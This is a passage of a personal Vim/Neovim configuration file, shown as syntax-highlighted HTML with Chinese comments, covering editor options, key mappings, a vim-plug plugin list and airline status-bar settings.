$&quot;</span>|<span class="keyword">endif</span>|<span class="keyword">endif</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 打开是运行指令 取消上回搜索内容的高亮</span></span><br><span class="line">exec <span class="string">&quot;nohlsearch&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ==</span></span><br><span class="line"><span class="comment">&quot; &gt;&gt;Let</span></span><br><span class="line"><span class="comment">&quot; ==START==</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> mapleader=<span class="string">&quot; &quot;</span>	<span class="comment">&quot; 将leader键（\键,类似于Windows键）换成空格（相当于空格键）</span></span><br><span class="line"><span class="keyword">let</span> &amp;t_ut=<span class="string">&#x27;&#x27;</span>		<span class="comment">&quot; 矫正部分配色</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 不同模式下的光标样式</span></span><br><span class="line"><span class="keyword">let</span> &amp;t_SI = <span class="string">&quot;\&lt;Esc&gt;]50;CursorShape=1\x7&quot;</span></span><br><span class="line"><span class="keyword">let</span> &amp;t_SR = <span class="string">&quot;\&lt;Esc&gt;]50;CursorShape=2\x7&quot;</span></span><br><span class="line"><span class="keyword">let</span> &amp;t_EI = <span class="string">&quot;\&lt;Esc&gt;]50;CursorShape=0\x7&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; python解释器</span></span><br><span class="line"><span class="comment">&quot;</span></span><br><span class="line"><span class="comment">&quot;let g:python_host_prog=&#x27;/usr/bin/python2&#x27;</span></span><br><span class="line"><span class="comment">&quot;let g:python3_host_prog=&#x27;/usr/bin/python3&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ==END==</span></span><br><span class="line"><span class="comment">&quot; &gt;&gt;let</span></span><br><span class="line"><span class="comment">&quot; ==</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ==</span></span><br><span class="line"><span class="comment">&quot; &gt;&gt;set</span></span><br><span class="line"><span class="comment">&quot; ==START==</span></span><br><span class="line"><span class="keyword">set</span> nocompatible	<span class="comment">&quot; 不兼容 VI ,compatible为兼容(tab将不会变成空格)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> fileencodings=utf-<span class="number">8</span>,gbk	<span class="comment">&quot; 写入文件时采用的编码类型</span></span><br><span class="line"><span class="keyword">set</span> termencoding=utf-<span class="number">8</span>		<span class="comment">&quot; 输出到终端时采用的编码类型</span></span><br><span class="line"><span class="keyword">set</span> encoding=utf-<span class="number">8</span>	<span class="comment">&quot; 缓存的文本、寄存器、Vim 脚本文件等</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">number</span>			<span class="comment">&quot; 显示行号	缩写： nu</span></span><br><span class="line"><span class="keyword">set</span> relativenumber	<span class="comment">&quot; 从当前行向前向后算行数</span></span><br><span class="line"><span class="keyword">set</span> cursorline		<span class="comment">&quot; 突出显示当前行	缩写： cul</span></span><br><span class="line"><span class="string">&quot;set cursorcolumn	&quot;</span> 突出显示当前列	缩写： cuc</span><br><span class="line"><span class="keyword">set</span> showmatch		<span class="comment">&quot; 显示括号匹配</span></span><br><span class="line"><span class="keyword">set</span> showcmd			<span class="comment">&quot; 显示指令</span></span><br><span class="line"><span class="keyword">set</span> laststatus=<span class="number">2</span>	<span class="comment">&quot; 显示状态栏</span></span><br><span class="line"><span class="keyword">set</span> ruler			<span class="comment">&quot; 显示光标当前位置</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> wrap			<span class="comment">&quot; 自动换行</span></span><br><span class="line"><span class="keyword">set</span> tw=<span class="number">0</span>			<span class="comment">&quot; 防止自动分割行</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;set expandtab		&quot;</span> 自动将制表符换成空格</span><br><span class="line"><span class="keyword">set</span> tabstop=<span class="number">4</span>		<span class="comment">&quot; 制表符长度为4空格	缩写：ts</span></span><br><span class="line"><span class="keyword">set</span> <span class="built_in">shiftwidth</span>=<span class="number">4</span>	<span class="comment">&quot; 自动缩进长度为4空格</span></span><br><span class="line"><span class="keyword">set</span> autoindent		<span class="comment">&quot; 自动缩进</span></span><br><span class="line"><span class="keyword">set</span> <span class="built_in">cindent</span>			<span class="comment">&quot; c格式自动缩进</span></span><br><span class="line"><span class="keyword">set</span> smartindent		<span class="comment">&quot; 遇右花括号 &#125; 取消缩进的自动缩进</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> wildmenu		<span class="comment">&quot; 命令补全</span></span><br><span class="line"><span class="keyword">set</span> autochdir       <span class="comment">&quot; 在当前目录下执行命令</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> hlsearch		<span class="comment">&quot; 高亮显示搜索</span></span><br><span class="line"><span class="keyword">set</span> incsearch		<span class="string">&quot; 动态高亮搜索&quot;</span></span><br><span class="line"><span class="keyword">set</span> ignorecase		<span class="comment">&quot; 不区分大小写搜索</span></span><br><span class="line"><span class="keyword">set</span> smartcase		<span class="comment">&quot; 智能大小写搜索</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> mouse=<span class="keyword">a</span>			<span class="comment">&quot; 使用鼠标</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> backspace=<span class="built_in">indent</span>,eol,start	<span class="comment">&quot; 能退格到行尾</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ==END==</span></span><br><span class="line"><span class="comment">&quot; &gt;&gt;&gt;set</span></span><br><span class="line"><span class="comment">&quot; ==</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ==</span></span><br><span class="line"><span class="comment">&quot; &gt;&gt;键盘映射</span></span><br><span class="line"><span class="comment">&quot; ==START==</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; map 递归映射</span></span><br><span class="line"><span class="comment">&quot; map a b</span></span><br><span class="line"><span class="comment">&quot; map b c</span></span><br><span class="line"><span class="comment">&quot; a映射为c</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot; nmap 普通模式下的递归映射&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; noremap 不递归映射</span></span><br><span class="line"><span class="comment">&quot; noremap a b</span></span><br><span class="line"><span class="comment">&quot; noremap b c</span></span><br><span class="line"><span class="comment">&quot; a映射为b b映射为c 两个映射互不影响</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; unmap 取消 map 的映射</span></span><br><span class="line"><span class="comment">&quot; mapclear 取消所有 map 的映射</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;noremap a b	&quot;</span> 将 <span class="keyword">a</span> 映射为 <span class="keyword">b</span></span><br><span class="line"><span class="string">&quot;noremap A 5b	&quot;</span> 将 A 映射为 <span class="number">5</span><span class="keyword">b</span></span><br><span class="line"><span class="string">&quot;noremap = nzz	&quot;</span> 将 n 映射 =zz 	<span class="comment">&quot; 用 zz 将该行变成中心点</span></span><br><span class="line"><span class="string">&quot;noremap - Nzz	&quot;</span> 将 <span class="keyword">N</span> 映射 -zz</span><br><span class="line"><span class="keyword">noremap</span> <span class="symbol">&lt;LEADER&gt;</span><span class="symbol">&lt;CR&gt;</span> :<span class="keyword">nohlsearch</span><span class="symbol">&lt;CR&gt;</span>	<span class="comment">&quot; 将 &lt;LEADER&gt;&lt;CR&gt; 映射为 :nohlsearch&lt;CR&gt; 用于快捷取消搜索高亮</span></span><br><span class="line"><span class="keyword">noremap</span> J <span class="number">5</span><span class="keyword">j</span></span><br><span class="line"><span class="keyword">noremap</span> K <span class="number">5</span><span class="keyword">k</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 复制到系统剪切板</span></span><br><span class="line"><span class="string">&quot;vnoremap Y :w !xclip -i -sel c&lt;CR&gt;	&quot;</span> 需要安装xclip  #sudo pacman -S xclip</span><br><span class="line"><span class="keyword">vnoremap</span> Y <span class="string">&quot;+y		&quot;</span> 需要安装<span class="keyword">gvim</span>   #sudo pacman -S <span class="keyword">gvim</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 打开vimrc文件</span></span><br><span class="line"><span class="keyword">map</span> MR :<span class="keyword">e</span> $MYVIMRC<span class="symbol">&lt;CR&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">map</span> s <span class="symbol">&lt;nop&gt;</span></span><br><span class="line"><span class="keyword">map</span> S :<span class="keyword">w</span><span class="symbol">&lt;CR&gt;</span>	<span class="string">&quot; 将 S 的指令映射为 :w&lt;CR&gt; 	 &quot;</span> <span class="symbol">&lt;CR&gt;</span> 代表回车</span><br><span class="line"><span class="keyword">map</span> Q :q<span class="symbol">&lt;CR&gt;</span>	<span class="comment">&quot; 将 Q 的指令映射为 :q&lt;CR&gt;</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;silent&gt;</span> <span class="symbol">&lt;C-a&gt;</span> ggvG 	<span class="comment">&quot; Ctrl-A 选中所有内容</span></span><br><span class="line"><span class="string">&quot;map R :source $MYVIMRC&lt;CR&gt;		&quot;</span> 将 R 的指令映射成 重载vimrc配置</span><br><span class="line"><span class="comment">&quot; 打开新文件</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;LEADER&gt;</span>s :<span class="keyword">e</span><span class="symbol">&lt;Space&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">map</span> sk :<span class="keyword">set</span> splitbelow<span class="symbol">&lt;CR&gt;</span>:<span class="keyword">split</span><span class="symbol">&lt;CR&gt;</span>		<span class="string">&quot; 下分屏&quot;</span>:<span class="keyword">e</span> /文件路径 打开文件</span><br><span class="line"><span class="keyword">map</span> sj :<span class="keyword">set</span> nosplitbelow<span class="symbol">&lt;CR&gt;</span>:<span class="keyword">split</span><span class="symbol">&lt;CR&gt;</span>		<span class="comment">&quot; 上分屏</span></span><br><span class="line"><span class="keyword">map</span> <span class="keyword">sl</span> :<span class="keyword">set</span> nosplitright<span class="symbol">&lt;CR&gt;</span>:<span class="keyword">vsplit</span><span class="symbol">&lt;CR&gt;</span>		<span class="comment">&quot; 右分屏</span></span><br><span class="line"><span class="keyword">map</span> <span class="keyword">sh</span> :<span class="keyword">set</span> splitright<span class="symbol">&lt;CR&gt;</span>:<span class="keyword">vsplit</span><span class="symbol">&lt;CR&gt;</span>		<span class="comment">&quot; 左分屏	</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">map</span> sz <span class="symbol">&lt;C-w&gt;</span>t<span class="symbol">&lt;C-w&gt;</span>H 	<span class="comment">&quot; 竖向分屏换左右分屏</span></span><br><span class="line"><span class="keyword">map</span> ss <span class="symbol">&lt;C-w&gt;</span>t<span class="symbol">&lt;C-w&gt;</span>K		<span class="comment">&quot; 左右分屏换竖向分屏</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;LEADER&gt;</span><span class="keyword">k</span> <span class="symbol">&lt;C-w&gt;</span><span class="keyword">k</span>	<span class="comment">&quot; 光标到上屏</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;LEADER&gt;</span><span class="keyword">j</span> <span class="symbol">&lt;C-w&gt;</span><span class="keyword">j</span>	<span class="comment">&quot; 光标到下屏</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;LEADER&gt;</span><span class="keyword">l</span> <span class="symbol">&lt;C-w&gt;</span><span class="keyword">l</span>	<span class="comment">&quot; 光标到右屏</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;LEADER&gt;</span>h <span class="symbol">&lt;C-w&gt;</span>h	<span class="comment">&quot; 光标到左屏</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;up&gt;</span> :<span class="keyword">res</span> +<span class="number">5</span><span class="symbol">&lt;CR&gt;</span>				<span class="comment">&quot; 分屏线上移</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;down&gt;</span> :<span class="keyword">res</span> -<span class="number">5</span><span class="symbol">&lt;CR&gt;</span>				<span class="comment">&quot; 分屏线下移</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;left&gt;</span> :<span class="keyword">vertical</span> <span class="keyword">resize</span>+<span class="number">5</span><span class="symbol">&lt;CR&gt;</span>	<span class="comment">&quot; 分屏线左移</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;right&gt;</span> :<span class="keyword">vertical</span> <span class="keyword">resize</span>-<span class="number">5</span><span class="symbol">&lt;CR&gt;</span>	<span class="comment">&quot; 分屏线右移</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">map</span> <span class="keyword">tn</span> :<span class="keyword">tabe</span><span class="symbol">&lt;CR&gt;</span>		<span class="comment">&quot; ta打开新选项卡</span></span><br><span class="line"><span class="keyword">map</span> <span class="keyword">th</span> :-<span class="keyword">tabnext</span><span class="symbol">&lt;CR&gt;</span>	<span class="comment">&quot; 到左边的选项卡</span></span><br><span class="line"><span class="keyword">map</span> <span class="keyword">tl</span> :+<span class="keyword">tabnext</span><span class="symbol">&lt;CR&gt;</span>	<span class="comment">&quot; 到右边的选项卡</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ==END==</span></span><br><span class="line"><span class="comment">&quot; &gt;&gt;键盘映射</span></span><br><span class="line"><span class="comment">&quot; ==</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===END===</span></span><br><span class="line"><span class="comment">&quot; &gt;&gt;&gt;基础配置</span></span><br><span class="line"><span class="comment">&quot; ===</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===</span></span><br><span class="line"><span class="comment">&quot; &gt;&gt;&gt;插件安装</span></span><br><span class="line"><span class="comment">&quot; ===START===</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 安装plug：</span></span><br><span class="line"><span class="comment">&quot; curl -fLo ~/.vim/autoload/plug.vim --create-dirs https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">call</span> plug#begin(<span class="string">&#x27;~/.config/nvim/plugged&#x27;</span>)  <span class="comment">&quot; 启用plug安装</span></span><br><span class="line"><span class="comment">&quot; 插件github项目地址为：https://github.com/ 加 &#x27;&#x27; 中的内容</span></span><br><span class="line"><span class="comment">&quot; 如：https://github.com/vim-airline/vim-airline</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===状态栏===</span></span><br><span class="line">Plug <span class="string">&#x27;vim-airline/vim-airline&#x27;</span>	<span class="comment">&quot; 状态栏</span></span><br><span class="line">Plug <span class="string">&#x27;vim-airline/vim-airline-themes&#x27;</span>	<span class="comment">&quot; 状态栏主题</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===配色方案===</span></span><br><span class="line">Plug <span class="string">&#x27;lifepillar/vim-solarized8&#x27;</span>		<span class="comment">&quot; solarized8主题</span></span><br><span class="line">Plug <span class="string">&#x27;ayu-theme/ayu-vim&#x27;</span>				<span class="comment">&quot; ayu主题</span></span><br><span class="line">Plug <span class="string">&#x27;nathanaelkane/vim-indent-guides&#x27;</span>	<span class="comment">&quot; 显示缩进级别</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===目录树===</span></span><br><span class="line">Plug <span class="string">&#x27;scrooloose/nerdtree&#x27;</span>				<span class="comment">&quot; 目录树，方便浏览当前目录下的文件</span></span><br><span class="line">Plug <span class="string">&#x27;Xuyuanp/nerdtree-git-plugin&#x27;</span>      <span class="comment">&quot; 目录树git提示</span></span><br><span class="line">Plug <span class="string">&#x27;kien/ctrlp.vim&#x27;</span>					<span class="comment">&quot; 适用于大规模项目文件的浏览</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===自动化===</span></span><br><span class="line">Plug <span class="string">&#x27;neoclide/coc.nvim&#x27;</span>, &#123;<span class="string">&#x27;branch&#x27;</span>: <span class="string">&#x27;release&#x27;</span>&#125;		<span class="comment">&quot; 代码补全 需要vim &gt;=8 或neovim</span></span><br><span class="line">Plug <span class="string">&#x27;vim-syntastic/syntastic&#x27;</span>				<span class="comment">&quot; 错误语法提示</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===历史===</span></span><br><span class="line">Plug <span class="string">&#x27;mbbill/undotree&#x27;</span>					<span class="comment">&quot; 历史修改撤回</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===文本===</span></span><br><span class="line">Plug <span class="string">&#x27;godlygeek/tabular&#x27;</span>				<span class="comment">&quot; 文本过滤、对齐工具</span></span><br><span class="line">Plug <span class="string">&#x27;gcmt/wildfire.vim&#x27;</span>				<span class="comment">&quot; 视图模式下快速选中符号中的内容</span></span><br><span class="line">Plug <span class="string">&#x27;scrooloose/nerdcommenter&#x27;</span>			<span class="comment">&quot; 快速注释一行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; === JSON, CSS, PHP, JavaScript, HTML, etc.===</span></span><br><span class="line">Plug <span class="string">&#x27;elzr/vim-json&#x27;</span>  <span class="comment">&quot; JSON关键字与值的突出显示，特定于JSON（非JS）的警告，引号隐藏</span></span><br><span class="line">Plug <span class="string">&#x27;hail2u/vim-css3-syntax&#x27;</span>, &#123; <span class="string">&#x27;for&#x27;</span>: [<span class="string">&#x27;vim-plug&#x27;</span>, <span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;html&#x27;</span>, <span class="string">&#x27;javascript&#x27;</span>, <span class="string">&#x27;css&#x27;</span>, <span class="string">&#x27;less&#x27;</span>] &#125;  <span class="comment">&quot; CSS3语法支持</span></span><br><span class="line">Plug <span class="string">&#x27;spf13/PIV&#x27;</span>, &#123; <span class="string">&#x27;for&#x27;</span> :[<span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;vim-plug&#x27;</span>] &#125;  <span class="comment">&quot; PHP集成环境</span></span><br><span class="line">Plug <span class="string">&#x27;pangloss/vim-javascript&#x27;</span>, &#123; <span class="string">&#x27;for&#x27;</span>: [<span class="string">&#x27;vim-plug&#x27;</span>, <span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;html&#x27;</span>, <span class="string">&#x27;javascript&#x27;</span>, <span class="string">&#x27;css&#x27;</span>, <span class="string">&#x27;less&#x27;</span>] &#125;  <span class="comment">&quot; Javascript缩进和语法支持</span></span><br><span class="line">Plug <span class="string">&#x27;yuezk/vim-js&#x27;</span>, &#123; <span class="string">&#x27;for&#x27;</span>: [<span class="string">&#x27;vim-plug&#x27;</span>, <span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;html&#x27;</span>, <span class="string">&#x27;javascript&#x27;</span>, <span class="string">&#x27;css&#x27;</span>, <span class="string">&#x27;less&#x27;</span>] &#125;  <span class="comment">&quot;JavaScript和Flow.js的最准确的语法高亮</span></span><br><span class="line">Plug <span class="string">&#x27;MaxMEllon/vim-jsx-pretty&#x27;</span>, &#123; <span class="string">&#x27;for&#x27;</span>: [<span class="string">&#x27;vim-plug&#x27;</span>, <span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;html&#x27;</span>, <span class="string">&#x27;javascript&#x27;</span>, <span class="string">&#x27;css&#x27;</span>, <span class="string">&#x27;less&#x27;</span>] &#125;  <span class="comment">&quot; JSX 和 TSX 语法高亮</span></span><br><span class="line">Plug <span class="string">&#x27;jelera/vim-javascript-syntax&#x27;</span>, &#123; <span class="string">&#x27;for&#x27;</span>: [<span class="string">&#x27;vim-plug&#x27;</span>, <span class="string">&#x27;php&#x27;</span>, <span class="string">&#x27;html&#x27;</span>, <span class="string">&#x27;javascript&#x27;</span>, <span class="string">&#x27;css&#x27;</span>, <span class="string">&#x27;less&#x27;</span>] &#125;  <span class="comment">&quot; 增强JavaScript语法</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===Go===</span></span><br><span class="line">Plug <span class="string">&#x27;fatih/vim-go&#x27;</span> , &#123; <span class="string">&#x27;for&#x27;</span>: [<span class="string">&#x27;go&#x27;</span>, <span class="string">&#x27;vim-plug&#x27;</span>], <span class="string">&#x27;tag&#x27;</span>: <span class="string">&#x27;*&#x27;</span> &#125;  <span class="comment">&quot; Go开发插件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===Python===</span></span><br><span class="line">Plug <span class="string">&#x27;tmhedberg/SimpylFold&#x27;</span>, &#123; <span class="string">&#x27;for&#x27;</span> :[<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;vim-plug&#x27;</span>] &#125;  <span class="comment">&quot; Python代码折叠</span></span><br><span class="line">Plug <span class="string">&#x27;Vimjas/vim-python-pep8-indent&#x27;</span>, &#123; <span class="string">&#x27;for&#x27;</span> :[<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;vim-plug&#x27;</span>] &#125;  <span class="comment">&quot; Python缩进</span></span><br><span class="line">Plug <span class="string">&#x27;numirias/semshi&#x27;</span>, &#123; <span class="string">&#x27;do&#x27;</span>: <span class="string">&#x27;:UpdateRemotePlugins&#x27;</span>, <span class="string">&#x27;for&#x27;</span> :[<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;vim-plug&#x27;</span>] &#125;  <span class="comment">&quot; Python语法高亮</span></span><br><span class="line">Plug <span class="string">&#x27;tweekmonster/braceless.vim&#x27;</span>  <span class="comment">&quot;用于Python和其他缩进语言的文本对象折叠</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===Markdon===</span></span><br><span class="line">Plug <span class="string">&#x27;iamcco/markdown-preview.nvim&#x27;</span>, &#123; <span class="string">&#x27;do&#x27;</span>: &#123; -&gt; mkdp#util#install() &#125;, <span class="string">&#x27;for&#x27;</span>: [<span class="string">&#x27;markdown&#x27;</span>, <span class="string">&#x27;vim-plug&#x27;</span>]&#125;  <span class="comment">&quot; markdowm预览</span></span><br><span class="line">Plug <span class="string">&#x27;dhruvasagar/vim-table-mode&#x27;</span>, &#123; <span class="string">&#x27;on&#x27;</span>: <span class="string">&#x27;TableModeToggle&#x27;</span> &#125;	<span class="comment">&quot; 表格制作工具</span></span><br><span class="line">Plug <span class="string">&#x27;mzlogin/vim-markdown-toc&#x27;</span>, &#123; <span class="string">&#x27;for&#x27;</span>: [<span class="string">&#x27;gitignore&#x27;</span>, <span class="string">&#x27;markdown&#x27;</span>] &#125;  <span class="comment">&quot; 目录生成</span></span><br><span class="line">Plug <span class="string">&#x27;theniceboy/bullets.vim&#x27;</span>  <span class="comment">&quot; 自动添加项目列表符号</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===Git===</span></span><br><span class="line">Plug <span class="string">&#x27;theniceboy/vim-gitignore&#x27;</span>, &#123; <span class="string">&#x27;for&#x27;</span>: [<span class="string">&#x27;gitignore&#x27;</span>, <span class="string">&#x27;vim-plug&#x27;</span>] &#125;  <span class="comment">&quot; 为.gitignore文件提供语法高亮显示和最新代码片段</span></span><br><span class="line">Plug <span class="string">&#x27;fszymanski/fzf-gitignore&#x27;</span>, &#123; <span class="string">&#x27;do&#x27;</span>: <span class="string">&#x27;:UpdateRemotePlugins&#x27;</span> &#125;  <span class="comment">&quot; fzf接口，用于使用gitignore.io API创建.gitignore文件</span></span><br><span class="line"><span class="string">&quot;Plug &#x27;mhinz/vim-signify&#x27;  &quot;</span>使用Vim的符号列显示差异</span><br><span class="line">Plug <span class="string">&#x27;airblade/vim-gitgutter&#x27;</span>  <span class="comment">&quot; 显示git diff。 它显示了已添加，修改或删除的行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===编辑增强===</span></span><br><span class="line">Plug <span class="string">&#x27;jiangmiao/auto-pairs&#x27;</span>  <span class="comment">&quot; 符号补全</span></span><br><span class="line">Plug <span class="string">&#x27;mg979/vim-visual-multi&#x27;</span>  <span class="comment">&quot; 多光标支持</span></span><br><span class="line">Plug <span class="string">&#x27;tpope/vim-surround&#x27;</span>  <span class="comment">&quot; 符号环境，轻松对符号内的内容进行修改</span></span><br><span class="line">Plug <span class="string">&#x27;junegunn/vim-after-object&#x27;</span> <span class="comment">&quot; 指定内容操作 ，da=  删除=后的内容</span></span><br><span class="line">Plug <span class="string">&#x27;junegunn/vim-easy-align&#x27;</span> <span class="comment">&quot; 对齐插件 ， gaip=  使段落仲的 = 对齐</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===其他===</span></span><br><span class="line"><span class="string">&quot;Plug &#x27;yianwillis/vimcdoc&#x27;  &quot;</span> <span class="keyword">vim</span>中文帮助</span><br><span class="line"><span class="string">&quot;Plug &#x27;liuchengxu/vim-which-key&#x27;  &quot;</span> 显示被绑定的可用按键</span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ==依赖==</span></span><br><span class="line">Plug <span class="string">&#x27;MarcWeber/vim-addon-mw-utils&#x27;</span></span><br><span class="line">Plug <span class="string">&#x27;kana/vim-textobj-user&#x27;</span></span><br><span class="line">Plug <span class="string">&#x27;fadein/vim-FIGlet&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">call</span> plug#end()		<span class="comment">&quot;结束plug安装</span></span><br><span class="line"><span class="comment">&quot; 刷新vimrc后使用 :PlugInstall 安装插件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===END===</span></span><br><span class="line"><span class="comment">&quot; &gt;&gt;&gt;插件安装</span></span><br><span class="line"><span class="comment">&quot; ===</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===</span></span><br><span class="line"><span class="comment">&quot; &gt;&gt;&gt;插件配置</span></span><br><span class="line"><span class="comment">&quot; ===START===</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ===状态栏===</span></span><br><span class="line"><span class="comment">&quot; ==airline状态栏==</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:airline</span>#extensions#tabline#enabled = <span class="number">1</span>	<span class="comment">&quot; airline 显示选项卡和缓冲区</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:airline_theme</span>=<span class="string">&#x27;jellybeans&#x27;</span></span><br><span class="line"><span class="comment">&quot; 状态栏分隔美化  需要安装powerline-fonts字体（https://github.com/powerline/fonts） #sudo pacman -S powerline-fonts</span></span><br><span class="line"><span class="keyword">if</span> !exists(<span class="string">&#x27;g:airline_symbols&#x27;</span>)</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">g:airline_symbols</span> = &#123;&#125;</span><br><span class="line">  <span class="keyword">endif</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:airline_left_sep</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:airline_left_alt_sep</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:airline_right_sep</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:airline_right_alt_sep</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:airline_symbols</span>.branch = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:airline_symbols</span>.readonly = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:airline_symbols</span>.linenr = <span class="string">&#x27;☰&#x27;</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:airline_symbols</span>.maxlinenr = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:airline_symbols</span>.dirty= <span class="string">&#x27;⚡&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; ==状态模式简洁显示==</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:airline_mode_map</span> = &#123;</span><br><span class="line">      \ <span class="string">&#x27;__&#x27;</span>     : <span class="string">&#x27;-&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;c&#x27;</span>      : <span class="string">&#x27;C&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;i&#x27;</span>      : <span class="string">&#x27;I&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;ic&#x27;</span>     : <span class="string">&#x27;I&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;ix&#x27;</span>     : <span class="string">&#x27;I&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;n&#x27;</span>      : <span class="string">&#x27;N&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;multi&#x27;</span>  : <span class="string">&#x27;M&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;ni&#x27;</span>     : <span class="string">&#x27;N&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;no&#x27;</span>     : <span class="string">&#x27;N&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;R&#x27;</span>      : <span class="string">&#x27;R&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;Rv&#x27;</span>     : <span class="string">&#x27;R&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;s&#x27;</span>      : <span class="string">&#x27;S&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;S&#x27;</span>      : <span class="string">&#x27;S&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;&#x27;</span>     : <span class="string">&#x27;S&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;t&#x27;</span>      : <span class="string">&#x27;T&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;v&#x27;</span>      : <span class="string">&#x27;V&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;V&#x27;</span>      : <span class="string">&#x27;V&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;&#x27;</span>     : <span class="string">&#x27;V&#x27;</span>,</span><br><span class="line">      \ 